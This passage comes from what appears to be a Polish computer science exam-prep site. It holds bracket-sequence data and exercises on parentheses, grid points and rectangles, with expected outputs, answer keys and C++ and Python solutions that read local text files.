}()}[[]]({})[]]{[(()){}]{{{()}()}({})()}(())[{}]{(())[]}{({}){}}(())()}({})([{}][]){[[[]][]][]}[()]{}}([])(())[]\n[{{[[]]{}}[({{([()]{})[[{}][]]()}((())[]){}}[{}]{})()]()}{{{}}[]}[]]{[[{()}()]({([{}]{})[]}({{[[()][()]{}]{}}()}{})()){[[{}]{[[]][[]][]}{}][]}(([]){})[{[]}{[{}]({})([]){}}()][]]()}{(()){()}[{}][{}][[]]{}}{{}}[[{[]}[]][({})[]][[]][{}]()]()\n([[({(([]){})()}{{}}{{[[]](())[({})(}]{}}()}(()){})([]){}]{}]{}){{[]}(({})[()]{}){}}(((())())((([()][])()){}){{[]}[[]]{}}[])({([])(()){}}[])[{([])[]}{}]{}\n{([[]]{(({}){}){{([])[]}()}()}[[[]]()]([]){}){(([]){})([()][{[[]]{}}(())[]]{()}{[[]][]}[])[()](({([]){}}())[{}]{{}}()){}}[]}([{}]{})([{[{({})[[]]()}{()}[]]{}}{}][])([()][])({()}{[]}{})()\n{[{{{}}[({}){}]{}}{[[{[]}()]{}]{[]}{{{}}(())()}({})[[]]((())[])({{()}{}}[])[{}](())()}[{()}[]][(([[[]](()){}]())())[]]()](([[]]{[]}[()]([])()){}){[([])[[]]()][]}{[{}]{}}({})[[]]{}}([]){}\n(([[[]]({(())[]}[()]([])[]){()}()][])([]){()}[{}]([])(()){{}}([]){})((([{}]{{{}}{[]}()}[(([]){[]}()){[]}({}){[]}[]][])[()]{()}())[])[{()}{{()}{}}[([[]][])[{}][]]()]([])()\n([[{[{}]()}[(()){()}()]{}]({[]}{}){{[]}()}{[{{()}[[]]({})[([]){{}}()]({{}}{})[]}()]{{}}(())()}[]]{[([{}]{([])()}{()}[])[]][{[{{}}[]][]}{}][]}()){[([])[([]){()}{[{}][[]]{}}{}]([[[]]()][])()]{{[[()]{[]}{}][{()}()][{()}[]]{}}{}}{[]}{}}{}\n{{}}({({[({})[]]{()}{[()]({})()}()}([)){([[]][()]()){{{}}()}()}([[()]{}][[]]())()){[]}{}}{{{}}{[()]([])(())()}()}({{[]}{}}())(()){})[({}){}][()]({[]}()){}\n[[{[{({()}{[]}[]){{{}}[])[()][()]()}()]({})[(((()){})[])()]()}()][()][[(([])[{}][])()][]]{}][((()){[{}][]}{})([()]()){}]({{(()){([]){{[]}{}}{{()}{[()]{}}[]}{()}()}[]}{}}[])[]\n{(({}){[[{()}[]][{}]{}][]}([{()}()][])[{{}}{}]{[[{}][]]([])[]}{})(({[]}{}){})[{[]}[]]([[[(())[]]({()}[[{}]{}]{})[{}]([]){}]{{}}()]{})[]}(({{[[[]]{([[]]{{[[]][]}()}{})[]}{[]}[]][]}{[]}{{}}[({{}}[[]]{})(())[]][]}(()){}){[]}[])[[[({}){()}[()]()][{}][[]]()]()][{()}{}][()][]\n{[[[[()]([])[]]{{[]}({}){}}[]][[]]{{((())[[[]]{}]{})({()}{}){}}{}}({})[{}]{()}(([[]][])())({}){{[]}{}}{[]}[]]({({[]}{([])({[]}{})()}{})(([]){({}){}}[]){}}()){{{{}}{()}[]}[()](())([]){()}[()]{}}{}}(({[[]]{()}()}())[{}]{})[]\n{[[{[{[([[()]{}]([]){{}}{})[{}][]][]}{{}}[]][]}(({}){})[{()}{{[{}](()){}}[]}{}]{}][(([])[])({()}{([(()){}]()){}}[{}]())()][{}]{}]([])([])(({})[])[{{}}(()){}]([()][])(()){{}}{}}[[]](({{{(([{}]())[()][])[]}({}){[]}{}}{[]}[]}[])[]){}   \n({}){({({}){(()){}}{([()]())()}{}}{})[]}{([()](({}){{}}([()]())([()]{}){{}}{({})()}{}){[]}[])([])[[]]()}(([((({}){[()][]}())[]){}]()){({})[(())(())()]()}[])[]\n[([[()]()](((())[])[])[({})[]][{[{}][]}{}][()][])([[]]([(()){}]{()}(())())[]){()}({[[{(())[[]]{()}()}[]]()]{[]}{}}())(()){()}[]](([]){({()}[])[]}{}){({()}())[([])[[]]()][{}]()}()\n{{[[[[{({})[[[]]{{}}()]()}{}][[[{}]({([()][])[]}[]){{[[{}][]]{}}[]}()]{}]{}]{[]}[[[]]{[]}()]{}]({([[]]())([{[]}([])()][[]][])[]}())[{}][()][()]()]([{()}[[]]()](())[]){()}[{}]()}([{}](())[{}]([])[[]][])(({[]}(())(())())(())[]){}}{[()]()}[]\n{([([]){()}(([{}][]){})[]]())[[[{{[{}]()}(())({})[{[]}()]{{()}[]}([]){}}[]][]]{{[{[{[]}({[]}())[]]{{([])()}()}[]}()]{{()}()}{[()]{}}()}()}([[{}][[[]][]][]]{{}}{()}{})()]()}({{[(())[]]{[(())[]][[]][()][]}{[{()}()][]}()}((()){}){()}()}[]){}\n{[[{[]}{()}(())[]]{}]{({()]())({})({()}{[([({})[]]{})[()]()]()}{})[([()]{})()]{([]){()}{}}{}}(([])[{}]{}){}}{{{[([])[]][]}(())[[()][[[]]{[[{([])[]}([])[]]{}]()}([{}]()){}](())(()){}]{}}([[]]{{[]}[[]]{}}())()}(({[]}())([])([])[])()   \n[[{{}}[{[]}[{[]}{()}[{({{}}[])()}([]){}]{}][]]{{([[([]){}]{}][(())({})[]]([])((())()){[]}[])()}[]}[({{[{}]()}[]}([])({}){}){}][[()](())[]]{}][(())()]{[{}]{}}[]]([([(()){[[]][]}[]][{{}}[]]{})()]((())[()]{}){[{}]{{}}[]}({()}{[{{}}[]]{{{({[]}()){}}[]}()}{}}{({()}()){}}[{[]}{}][]){[()][{}]{}}{}){}\n[{()}[{[]}{()}{({})()}{}]({{}}{{([(()){}]({{}}([]){([{}]{})[]}{})[])()}{}}{()}([[]][[{}]{[]}[]]())[{}]())({[()][]}{}){([(()){}]{})()}[]]{[[{({(())[{{}}()]{{[]}([])()}{{{}}[]}()}[])()}[([{}]{}){}][()]((()){[[]]{}}())()]{}]([[]]{[]}{{{}}[]}{})[{}]{}}({{{}}([])({})[]}())(([])[])[]\n([({{}}()){}][[{[]}{}][()][]]{{[]}({()}{})[{({})[()]({}){{}}{()}[]}([{{}}()][]){}]()}[[({})[]]{[]}(([])[]){([])([])[[[]]()][]}{}]({[]}(())[])[[()]((()){([]){}}{}){}]{}){{[{()}({(()){}}[()](())([])())[]]{}}[{([])[]}({[]}[{{}}[()][]]([])[{}]{})()][[[]]{}](()){[]}{()}()}{}\n([[]][({[[]](())[]}({([{}]{})()}[()]({})())([{}]([])[]){([])[{([]){()}[]}[]][([]){}](())[]}{{}}{})([]){[{}][]}()][[[[[[]][]]{}]([])[[]]()][]]{({{}}[(([[[]]{}]{})[])[]]{()}()){}}{}){[[]]{({{}}{})[]}[]}[{([]){[{()}[{{}}[]]()]([])[[]]()}(({}){()}({{[]}[]}[[]][]){}){[]}{}}{[{({()}())({()}[()]{(()){}}{})[]}[]][]}({})([[{{}}[[]]()][]]{}){{}}{}][]\n(([{[[]]()}[({})[()][()]{}]{}][(()){{}}(([])())[]][()][{[[]]([])()}[]]{[]}[])[()]{})[{([{{[]}([])()}({})([()]())()]([({})[[]]()]{})[[]][])()}()]([([])()]())[[[([([])(([]){}){}][])()][{[]}[([{{}}{}]())()]({})()]{{()}([]){}}()]([])[[{}]{[]}[]]{(({{}}[[([])()]{}]()){})[]}()]{{{[]}[]}[{}][[]][]}{}\n(((({([()]([[[]][]]{}){[]}([{}]{})[])()}[[()][]]())([()][]){([]){}}[])[[({()}{}){}]{()}()]{()}[[]][{}]())()){{{{}}({[()]({}){()}({({{}}()){}}()){{}}({})()}({})({{}}[()]([]){}){[]}[[]]([])[])[[([])[(())[]][]]{[]}{}][]}()}([[[]]([({(())()}[{}]{})[]](()){})()][])([])({})[{{}}()]()\n[[(([]){})([(({[]}{[]}({})[{}][]){}){()}{}]{(()){}}[[]][]){{{[{}]()}{{}}()}{{}}[{{}}{}][[]]{}}[]](()){{{}}{[{{}}()][]}[{}]{(()){}}[{[]}{}][]}[()]({})[]]{[{()}{}][{()}()]({()}{}){}}[{{}}[(({}){{}}())(())[{({}){()}()}{()}{}][]][[]]{()}{[]}[{}]{}]({{(()){(())[]}({}){[[()][]]{[]}[]}[()][([])()]()}{(())[([])()]()}({{()}()}{()}[])([])(())[{}]()}[])(([{}]())[[[]][{}]{[]}[]][])()\n[({[]}((([]){[]}(([])[])[]){[]}{[()]{()}({[]}[])()}{{[]}([]){}}())[{[]}[[()][()]{}]([]){{}}[]]({(([[]]({{}}{[]}()){([]){}}{})([]){})[]}{}){()}([()][])({}){})([])([()]([])[])[]]{({}){{{({})[{{{}}{}}[]]()}[]}()}(())()}{(({})[()][{}][])({()}[({})()]([]){[[]]()}{()}(({[]}{()}())()){}){[({{}}{([])[]}())[]]{{[{}]{}}{{}}{}}({})[[]]{}}()}[{{}}([()][[{}][]]{}){([{[]}{}][])()}[]][]\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/answers/#zadanie-3","title":"Zadanie 3","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/answers/#wynik","title":"Wynik","text":"<pre><code>7 2\n7 2\n10 2\n5 2\n7 5\n11 2\n6 2\n7 2\n8 2\n7 2\n6 2\n6 2\n4 2\n7 2\n6 2\n3 2\n3 2\n3 2\n8 2\n7 2\n10 2\n5 2\n6 2\n6 2\n4 5\n6 2\n5 2\n5 2\n5 2\n4 2\n6 2\n4 2\n7 2\n6 2\n7 2\n7 2\n2 2\n7 2\n6 2\n7 2\n9 2\n6 2\n3 2\n4 2\n5 2\n5 2\n5 3\n8 2\n9 2\n5 2\n4 2\n5 2\n6 2\n5 2\n8 2\n5 2\n4 2\n5 2\n7 2\n8 2\n6 2\n3 2\n7 2\n5 2\n8 2\n5 2\n4 2\n7 2\n8 2\n4 2\n5 2\n4 2\n4 2\n6 2\n5 2\n4 2\n7 2\n5 2\n3 2\n4 2\n4 2\n4 2\n6 2\n4 2\n8 2\n7 2\n7 2\n6 2\n6 2\n9 3\n7 2\n4 2\n8 2\n4 2\n7 2\n5 2\n5 2\n4 2\n5 2\n4 2\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/solution-cpp/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/solution-cpp/#zadanie-1","title":"Zadanie 1","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;stack&gt;\n\nusing namespace std;\n\nint exercise1()\n{\n    vector&lt;string&gt; tab;\n    string line;\n    ifstream file(\"../../../../assets/parentheses.txt\");\n    while (file &gt;&gt; line &amp;&amp; !file.eof())\n    {\n        tab.push_back(line);\n    }\n\n    file.close();\n\n    int count = 0;\n    for (auto &amp;par : tab)\n    {\n        stack&lt;char&gt; st;\n        bool ok = true;\n        char top;\n        for (auto &amp;c : par)\n        {\n            if (c == '(' || c == '[' || c == '{')\n            {\n                st.push(c);\n                continue;\n            }\n\n            if (st.empty())\n            {\n                ok = false;\n                break;\n            }\n\n            top = st.top();\n            if ((c == ')' &amp;&amp; top != '(') || (c == ']' &amp;&amp; top != '[') || (c == '}' &amp;&amp; top != '{'))\n            {\n                ok = false;\n                break;\n            }\n\n            st.pop();\n        }\n\n        if (ok &amp;&amp; st.empty())\n        {\n            count++;\n        }\n    }\n\n    return count;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/solution-cpp/#zadanie-2","title":"Zadanie 2","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;algorithm&gt;\n\nusing namespace std;\n\nbool compare(const string &amp;a, const string &amp;b)\n{\n    int round1 = 0, round2 = 0, square1 = 0, square2 = 0, curly1 = 0, curly2 = 0;\n    for (auto &amp;el : a)\n    {\n        if (el == '(' || el == ')')\n        {\n            round1++;\n        }\n        else if (el == '[' || el == ']')\n        {\n            square1++;\n        }\n        else\n        {\n            curly1++;\n        }\n    }\n\n    for (auto &amp;el : b)\n    {\n        if (el == '(' || el == ')')\n        {\n            round2++;\n        }\n        else if (el == '[' || el == ']')\n        {\n            square2++;\n        }\n        else\n        {\n            curly2++;\n        }\n    }\n\n    if (round1 &lt; round2)\n    {\n        return true;\n    }\n    else if (round1 &gt; round2)\n    {\n        return false;\n    }\n    else if (square1 &lt; square2)\n    {\n        return true;\n    }\n    else if (square1 &gt; square2)\n    {\n        return false;\n    }\n    else\n    {\n        return curly1 &lt; curly2;\n    }\n}\n\nvector&lt;string&gt; exercise2()\n{\n    vector&lt;string&gt; tab;\n    string line;\n    ifstream file(\"../../../../assets/parentheses.txt\");\n    while (file &gt;&gt; line &amp;&amp; !file.eof())\n    {\n        tab.push_back(line);\n    }\n\n    file.close();\n\n    sort(tab.begin(), tab.end(), compare);\n\n    return tab;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/solution-cpp/#zadanie-3","title":"Zadanie 3","text":"<pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n\nusing namespace std;\n\nvoid exercise3()\n{\n    vector&lt;string&gt; tab;\n    string line;\n    ifstream file(\"../../../../assets/parentheses.txt\");\n    while (file &gt;&gt; line &amp;&amp; !file.eof())\n    {\n        tab.push_back(line);\n    }\n\n    file.close();\n\n    for (auto &amp;par : tab)\n    {\n        int max_opening_length = 0,\n            max_closing_length = 0,\n            current_opening_length = 0,\n            current_closing_length = 0;\n        for (auto &amp;c : par)\n        {\n            if (c == '(' || c == '[' || c == '{')\n            {\n                current_closing_length = 0;\n                current_opening_length++;\n                max_opening_length = max(max_opening_length, current_opening_length);\n            }\n            else\n            {\n                current_opening_length = 0;\n                current_closing_length++;\n                max_closing_length = max(max_closing_length, current_closing_length);\n            }\n        }\n\n        cout &lt;&lt; max_opening_length &lt;&lt; \" \" &lt;&lt; max_closing_length &lt;&lt; endl;\n    }\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/solution-python/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/solution-python/#zadanie-1","title":"Zadanie 1","text":"<pre><code>def exercise1():\n    path = \"parentheses.txt\"\n    result = 0\n    pairs = {\"(\": \")\", \"{\": \"}\", \"[\": \"]\"}\n    with open(path) as file:\n        parentheses = file.read().split()\n        for par in parentheses:\n            stack = []\n            ok = True\n            for char in par:\n                if char in [\"[\", \"(\", \"{\"]:\n                    stack.append(char)\n                    continue\n\n                if len(stack) == 0:\n                    ok = False\n                    break\n\n                top = stack.pop(-1)\n                if pairs[top] != char:\n                    ok = False\n                    break\n\n            if ok and len(stack) == 0:\n                result += 1\n\n    return result\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/solution-python/#zadanie-2","title":"Zadanie 2","text":"<pre><code>def exercise2():\n    path = \"parentheses.txt\"\n    with open(path) as file:\n        parentheses = file.read().split()\n        parentheses.sort(key=lambda el : (el.count(\"(\") + el.count(\")\"), el.count(\"[\") + el.count(\"]\"), el.count(\"{\") + el.count(\"}\")))\n        return parentheses\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/parentheses/solution-python/#zadanie-3","title":"Zadanie 3","text":"<pre><code>def exercise3():\n    path = \"parentheses.txt\"\n    with open(path) as file:\n        parentheses = file.read().split()\n        for par in parentheses:\n            max_opening_length = 0\n            max_closing_length = 0\n            current_opening_length = 0\n            current_closing_length = 0\n            for char in par:\n                if char in [\"[\", \"(\", \"{\"]:\n                    current_closing_length = 0\n                    current_opening_length += 1\n                    max_opening_length = max(max_opening_length, current_opening_length)\n                else:\n                    current_opening_length = 0\n                    current_closing_length += 1\n                    max_closing_length = max(max_closing_length, current_closing_length)\n\n            print(max_opening_length, max_closing_length)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/","title":"Punkty","text":"<p>W pliku points.txt znajduje si\u0119 tysi\u0105c linii. Ka\u017cda linia zawiera dwie liczby naturalne z przedzia\u0142u \\([1, 100]\\) oddzielone spacj\u0105. Ka\u017cda para warto\u015bci oznacza wsp\u00f3\u0142rz\u0119dne pola w tablicy o wymiarach \\(100\\times100\\) (pierwsza liczba to numer wiersza, druga to numer kolumny). </p> <p> points.txt</p> <p>Plik points_test.txt zawiera sto linii, a w ka\u017cdej znajduje si\u0119 jedna para liczb naturalnych z przedzia\u0142u \\([1, 10]\\) oddzielona spacj\u0105. Warto\u015bci oznaczaj\u0105 wsp\u00f3\u0142rz\u0119dne pola w tablicy o wymiarach \\(10\\times10\\) (pierwsza liczba to numer wiersza, druga to numer kolumny).</p> <p> points_test.txt</p> <p>Do ka\u017cdego pola w tablicy przypisana jest warto\u015b\u0107 liczbowa. Zak\u0142adamy, \u017ce pocz\u0105tkowo wszystkie pola w tablicy maj\u0105 warto\u015b\u0107 zero. Je\u017celi wsp\u00f3\u0142rz\u0119dne pola znajduj\u0105 si\u0119 w pliku, to znaczy, \u017ce to pole zyskuje jeden punkt. Je\u017celi wsp\u00f3\u0142rz\u0119dne danego pola pojawiaj\u0105 si\u0119 wielokrotnie, to znaczy, \u017ce to pole zyskuje tyle samo punkt\u00f3w, ile razy jego wsp\u00f3\u0142rz\u0119dne si\u0119 pojawi\u0142y.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/#zadanie-1","title":"Zadanie 1","text":"<p>Ile jest w tablicy p\u00f3l, kt\u00f3re maj\u0105 warto\u015b\u0107 wi\u0119ksz\u0105 od zera? </p> <p>Dla pliku points_test.txt wynik to 60.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/#zadanie-2","title":"Zadanie 2","text":"<p>Ile jest w tablicy wierszy, kt\u00f3re maj\u0105 sum\u0119 warto\u015bci swoich p\u00f3l wi\u0119ksz\u0105 od zera? Ile jest takich kolumn? </p> <p>Dla pliku points_test.txt wynik to:</p> <pre><code>Wiersze: 10\nKolumny: 10\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/#zadanie-3","title":"Zadanie 3","text":"<p>Ile jest w tablicy p\u00f3l, kt\u00f3re maj\u0105 warto\u015b\u0107 wi\u0119ksz\u0105 od jeden? </p> <p>Dla pliku points_test.txt wynik to 26.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/#zadanie-4","title":"Zadanie 4","text":"<p>Jaka jest najwi\u0119ksza warto\u015b\u0107 pola w tablicy? Podaj warto\u015b\u0107 i wsp\u00f3\u0142rz\u0119dne tego pola. Je\u017celi jest kilka takich p\u00f3l, podaj wsp\u00f3\u0142rz\u0119dne ich wszystkich. </p> <p>Dla pliku points_test.txt wynik to:</p> <pre><code>Warto\u015b\u0107: 4\nWsp\u00f3\u0142rz\u0119dne:\n1 6\n2 10\n7 4\n7 10\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/#zadanie-5","title":"Zadanie 5","text":"<p>Ile jest takich p\u00f3l w tablicy, kt\u00f3re przylegaj\u0105 w pionie i poziomie wy\u0142\u0105cznie do p\u00f3l o warto\u015bci zero? </p> <p>Dla pliku points_test.txt wynik to 2.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/#zadanie-6","title":"Zadanie 6","text":"<p>Policz, ile jest p\u00f3l o warto\u015bci zero, ile o warto\u015bci jeden itd. a\u017c do maksymalnej warto\u015bci w tablicy. </p> <p>Dla pliku points_test.txt wynik to:</p> <pre><code>Warto\u015b\u0107 0: 40\nWarto\u015b\u0107 1: 34\nWarto\u015b\u0107 2: 16\nWarto\u015b\u0107 3: 6\nWarto\u015b\u0107 4: 4\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/#zadanie-7","title":"Zadanie 7","text":"<p>Policz sum\u0119 warto\u015bci:</p> <ul> <li>na g\u0142\u00f3wnej przek\u0105tnej (lewo g\u00f3ra -&gt; prawo d\u00f3\u0142)</li> <li>na drugiej przek\u0105tnej (lewo d\u00f3\u0142 -&gt; prawo g\u00f3ra)</li> <li>pod g\u0142\u00f3wn\u0105 przek\u0105tn\u0105 (nie licz\u0105c element\u00f3w na przek\u0105tnej)</li> <li>nad g\u0142\u00f3wn\u0105 przek\u0105tn\u0105 (nie licz\u0105c element\u00f3w na przek\u0105tnej)</li> </ul> <p>Dla pliku points_test.txt wynik to:</p> <pre><code>G\u0142\u00f3wna przek\u0105tna: 10\nDruga przek\u0105tna: 11\nPod g\u0142\u00f3wn\u0105 przek\u0105tn\u0105: 33\nNad g\u0142\u00f3wn\u0105 przek\u0105tn\u0105: 46\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/#zadanie-8","title":"Zadanie 8","text":"<p>Policz, ile jest w tablicy takich poddtablic o wymiarach \\(2\\times2\\), w kt\u00f3rych warto\u015bci p\u00f3l si\u0119 nie powtarzaj\u0105.</p> <p>Dla pliku points_test.txt wynik to 6.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/points/answers/#zadanie-1","title":"Zadanie 1","text":"<pre><code>958\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/answers/#zadanie-2","title":"Zadanie 2","text":"<pre><code>Wiersze: 100\nKolumny: 100\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/answers/#zadanie-3","title":"Zadanie 3","text":"<pre><code>41\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/answers/#zadanie-4","title":"Zadanie 4","text":"<pre><code>Warto\u015b\u0107: 3\nWsp\u00f3\u0142rz\u0119dne:\n52 65\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/answers/#zadanie-5","title":"Zadanie 5","text":"<pre><code>9836\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/answers/#zadanie-6","title":"Zadanie 6","text":"<pre><code>Warto\u015b\u0107 0: 9042\nWarto\u015b\u0107 1: 917\nWarto\u015b\u0107 2: 40\nWarto\u015b\u0107 3: 1\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/answers/#zadanie-7","title":"Zadanie 7","text":"<pre><code>G\u0142\u00f3wna przek\u0105tna: 12\nDruga przek\u0105tna: 10\nPod g\u0142\u00f3wn\u0105 przek\u0105tn\u0105: 498\nNad g\u0142\u00f3wn\u0105 przek\u0105tn\u0105: 480\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/points/answers/#zadanie-8","title":"Zadanie 8","text":"<pre><code>0\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/","title":"Prostok\u0105ty","text":"<p>W pliku rectangles.txt znajduje si\u0119 opis \\(100\\) prostok\u0105t\u00f3w. Ka\u017cda linia w pliku zawiera cztery liczby ca\u0142kowite oddzielone spacj\u0105. Liczby oznaczaj\u0105 kolejno wsp\u00f3\u0142rz\u0119dne lewego g\u00f3rnego wierzcho\u0142ka prostok\u0105ta, oraz wsp\u00f3\u0142rz\u0119dne prawego dolnego wierzcho\u0142ka prostok\u0105ta. Np. warto\u015bci <code>1 4 3 2</code> oznaczaj\u0105 prostok\u0105t o lewym g\u00f3rnym wierzcho\u0142ku \\((1, 4)\\), a prawym dolnym wierzcho\u0142ku \\((3, 2)\\). Ka\u017cdy prostok\u0105t jest poprawnie zdefiniowany, tzn. ma niezerowe pole, a jego kraw\u0119dzie s\u0105 r\u00f3wnoleg\u0142e do osi uk\u0142adu wsp\u00f3\u0142rz\u0119dnych.</p> <p> rectangles.txt</p> <p>W pliku rectangles_test.txt znajduje si\u0119 opis \\(10\\) prostok\u0105t\u00f3w, taki jak napisano wy\u017cej.</p> <p> rectangles_test.txt</p> <p>Napisz program/programy rozwi\u0105zuj\u0105ce poni\u017csze zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/#zadanie-1","title":"Zadanie 1","text":"<p>Oblicz sumaryczne pole wszystkich prostok\u0105t\u00f3w. </p> <p>Dla pliku rectangles_test.txt wynik to \\(6508\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/#zadanie-2","title":"Zadanie 2","text":"<p>Oblicz, ile par prostok\u0105t\u00f3w si\u0119 przecina. Uwaga: je\u017celi prostok\u0105ty tylko stykaj\u0105 si\u0119 kraw\u0119dziami albo wierzcho\u0142kami, ale nie nachodz\u0105 na siebie, to uznajemy, \u017ce si\u0119 nie przecinaj\u0105.</p> <p>Wynik dla pliku rectangles_test.txt to \\(21\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdej pary prostok\u0105t\u00f3w, kt\u00f3re si\u0119 przecinaj\u0105, oblicz ich wsp\u00f3lne pole. Podaj sum\u0119 wszystkich takich p\u00f3l. </p> <p>Wynik dla pliku rectangles_test.txt to \\(3628\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/#zadanie-4","title":"Zadanie 4","text":"<p>Podaj wszystkie prostok\u0105ty, oraz ich liczb\u0119, kt\u00f3re zawieraj\u0105 wewn\u0105trz (nie na kraw\u0119dzi) \u015brodek uk\u0142adu wsp\u00f3\u0142rz\u0119dnych (punkt \\((0,0)\\)).</p> <p>Wynik dla pliku rectangles_test.txt to:</p> <pre><code>-33 11 34 -30\n\u0141\u0105cznie prostok\u0105t\u00f3w: 1\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/#zadanie-5","title":"Zadanie 5","text":"<p>Oblicz ile jest takich par prostok\u0105t\u00f3w, \u017ce jeden jest ca\u0142kowicie zawarty wewn\u0105trz drugiego (nie stykaj\u0105 si\u0119 kraw\u0119dziami).</p> <p>Wynik dla pliku rectangles_test.txt to: \\(2\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/#zadanie-6","title":"Zadanie 6","text":"<p>Analizuj\u0105c wszystkie punkty podane w pliku, znajd\u017a par\u0119 punkt\u00f3w, kt\u00f3re s\u0105 od siebie najbardziej oddalone. Wypisz t\u0119 par\u0119 oraz odleg\u0142o\u015b\u0107 pomi\u0119dzy nimi z dok\u0142adno\u015bci\u0105 do dw\u00f3ch miejsc po przecinku. Je\u017celi jest kilka takich par, wypisz wszystkie.</p> <p>Wynik dla pliku rectangles_test.txt to:</p> <pre><code>(-33, 11) (50, -50)\nOdleg\u0142o\u015b\u0107: 103.00\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/answers/#zadanie-1","title":"Zadanie 1","text":"<p>\\(66669\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/answers/#zadanie-2","title":"Zadanie 2","text":"<p>\\(1195\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/answers/#zadanie-3","title":"Zadanie 3","text":"<p>\\(290832\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/answers/#zadanie-4","title":"Zadanie 4","text":"<pre><code>-48 8 2 -44\n-14 23 37 -39\n-30 39 44 -42\n-38 23 35 -17\n-42 20 25 -45\n-4 46 42 -24\n-22 12 6 -17\n-46 6 48 -8\n-46 8 14 -24\n-22 20 11 -16\n-15 41 7 -3\n-23 36 38 -20\n-29 49 35 -3\n\u0141\u0105cznie prostok\u0105t\u00f3w: 13\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/answers/#zadanie-5","title":"Zadanie 5","text":"<p>\\(192\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/answers/#zadanie-6","title":"Zadanie 6","text":"<pre><code>(-42, -48) (44, 46)\nOdleg\u0142o\u015b\u0107: 127.40\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/solution-python/","title":"Rozwi\u0105zania - Python","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/solution-python/#zadanie-1","title":"Zadanie 1","text":"<pre><code>with open(\"rectangles.txt\") as file:\n    rectangles = [\n        list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")\n    ]\n\nresult = 0\nfor rect in rectangles:\n    x1, y1, x2, y2 = rect\n    width = x2 - x1\n    height = y1 - y2\n    result += width * height\n\nprint(result)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/solution-python/#zadanie-2","title":"Zadanie 2","text":"<pre><code>def do_rectangles_intersect(rect1, rect2):\n    x1, y1, x2, y2 = rect1\n    x3, y3, x4, y4 = rect2\n\n    if x2 &lt;= x3 or x4 &lt;= x1:\n        return False\n\n    if y1 &lt;= y4 or y3 &lt;= y2:\n        return False\n\n    return True\n\n\nwith open(\"rectangles.txt\") as file:\n    rectangles = [\n        list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")\n    ]\n\nresult = 0\nfor i, rect1 in enumerate(rectangles):\n    for rect2 in rectangles[i + 1 :]:\n        if do_rectangles_intersect(rect1, rect2):\n            result += 1\n\nprint(result)\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/rectangles/solution-python/#zadanie-3","title":"Zadanie 3","text":"<pre><code>def intersection_area(rect1, rect2):\n    x1, y1, x2, y2 = rect1\n    x3, y3, x4, y4 = rect2\n\n    intersect_x1 = max(x1, x3)\n    intersect_y1 = min(y1, y3)\n    intersect_x2 = min(x2, x4)\n    intersect_y2 = max(y2, y4)\n\n    width = intersect_x2 - intersect_x1\n    height = intersect_y1 - intersect_y2\n\n    if width &gt; 0 and height &gt; 0:\n        return width * height\n    else:\n        return 0\n\n\nwith open(\"rectangles.txt\") as file:\n    rectangles = [\n        list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")\n    ]\n\nresult = 0\nfor i, rect1 in enumerate(rectangles):\n    for rect2 in 